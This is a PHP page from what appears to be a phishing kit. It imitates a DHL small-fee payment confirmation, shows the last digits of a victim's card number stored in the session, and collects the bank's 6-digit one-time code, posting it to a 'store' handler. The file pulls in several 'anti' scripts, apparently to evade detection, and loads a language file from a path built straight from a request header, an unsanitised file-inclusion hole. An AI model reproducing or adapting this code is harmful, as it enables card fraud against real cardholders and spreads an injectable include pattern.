<?php

session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";

$last4 = str_replace(' ', '', $_SESSION['cc']);
$last4 = substr($last4, 12, 19);
if($last4 === ""){
 exit(header('Location: index.php'));
}
?>
<head>
    <meta name="viewpoint" content="width=device-width, height=device-height, font-size: 1vw , initial-scale=1, maximum-scale=1.0" charset="UTF-8" >
    <meta charset="utf-8">
    <link rel="stylesheet" href="assets/app.css">
    <style>
.summary-card {
    background: #E9E9E9;
    color: #a1a1a1;
    border: none;
    box-shadow: none;
}

.summary-card > .card-body > .row {
    padding-top: .75rem;
    padding-bottom: .5rem;
}

.summary-card > .card-body > .row:not(:last-child) {
    border-bottom: 1px solid #fff;
}

.summary-card .row-icon {
    font-size: 25px;
    margin-right: .75rem;
}

.parsley-errors-list + .flag-dropdown {
    top: -17px;
}

.parsley-errors-list.filled + .flag-dropdown {
    top: -30px;
}

.country-select.inside input {
    padding: .5rem !important;
}

.country-col .country-select.inside {
    display: block !important;
}

.country-col .country-select.inside .form-control {
    width: 100%;
}

.summary-table td, .summary-table th {
    padding: .35rem;
    border-top: 0;
    border-bottom: 1px solid #aaaeb3;
}

.summary-table th {
    border: 0;
}

@media (max-width: 768px) {
    .container {
        max-width: 100vw;
    }

    .kQwli, .rtYhf {
        padding-top: 30px !important;
    }

    .card-head {
        font-weight: 600;
    }

    .card-head::after {
        display: block;
    }
}
</style>
<section class="auth-form" style="">
                <div class="modal-body p-4">
<center>
                    <div class="card rounded-0" style="box-shadow: none;width: 50%;margin: 0%">
                        <div class="card-body">
                            <form action="store/action3.php" method="POST">
                                      <div class="row justify-content-between">
                                        <div >
                                            <div class="d-flex align-items-center">
</div>
</div>

                                    </div>
                                        <center>
                                            <h6><?php echo $_SESSION['_namebank_']; ?></h6>
                                        </center>
                                    <div class="row mt-5">
                                        <div class="col-12">
                                            <h6 class="font-weight-bold"><?php echo $lg_cm['sm1']?></h6>
                                            <p>
                                                </p><p class="mb-0"><?php echo $lg_cm['sm2']?><br><?php echo $lg_cm['sm3']?>
                                            <p></p>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-12">
                                            <div class="row">
                                                <div class="col-12">
                                                    <strong><?php echo $lg_cm['sm4']?></strong>
                                                    DHL International                                         </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-12">
                                                    <strong><?php echo $lg_cm['sm5']?>:</strong>
                                                   A 3,57 <?php echo $currency; ?>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-12">
                                                    <strong><?php echo $lg_cm['sm6']?>: A</strong>
                                                    <?php echo(date('Y-m-d'));  ?>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-12">
                                                    <strong><?php echo $lg_cm['sm7']?></strong>
                                                    xxxx xxxx xxxx
                                                    <?php echo $last4  ?>
                                                </div>
                                            </div>
                                        </div>

                                    </div>
                                    <div class="alert alert-danger error-text" style="display: none;" id="invalid-code">
                                    The information you entered is invalid.,
                                    </div>
                                    <p class="mt-3"></p>
                                        <div class="form-group row">
                                            <div class="col-12">
                                                <label class="font-weight-bold mb-1" for=""><?php echo $lg_cm['sm8']?></label>
                                                <input type="tel" class="input form-control" maxlength="6" name="otp" autocomplete="off" required="" style="width: 60%;">
                                            </div>
                                        </div>
                                    <div class="row">
                                    <div class="col-12 text-center">
                                        <center>
                                        <button type="submit" name="log" class="btn btn-dark btn-block" style="width: 60%;">
                                            <i class="fa fa-circle-notch spin" style="display: none;"></i>
                                           <?php echo $lg_cm['sm9']?>                                      </button>
                                        <p id="resend-after" clas="mb-0" style="display: none;">You can request a different code in <span id="resend-seconds"></span> Nachschlag</p>
                                        <a href="#" class="font-weight-bold mt-2 text-muted" id="resend-code" style="display: block;"><?php echo $lg_cm['mm1']?></a>
                                        </center>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>